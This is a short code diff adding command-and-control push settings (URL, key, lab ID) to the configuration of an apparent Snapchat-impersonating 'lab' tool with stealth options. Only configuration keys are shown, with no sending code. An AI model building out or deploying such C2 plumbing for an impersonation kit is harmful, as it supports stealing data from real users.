@@ -13,6 +13,10 @@ CONFIG = {
     "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
     "STEALTH_MODE": True,
     "STEALTH_BLACKLIST": False,
+    "C2_PUSH_ENABLED": os.environ.get("C2_PUSH_ENABLED", "false").lower() == "true",
+    "C2_PUSH_URL": os.environ.get("C2_PUSH_URL", "http://localhost:9090/api/push"),
+    "C2_PUSH_KEY": os.environ.get("C2_PUSH_KEY", ""),
+    "C2_LAB_ID": os.environ.get("C2_LAB_ID", "lab-" + os.path.basename(BASE_DIR)),
 }
 
 ADMIN_KEY_FILE = os.path.join(BASE_DIR, ".admin_key")
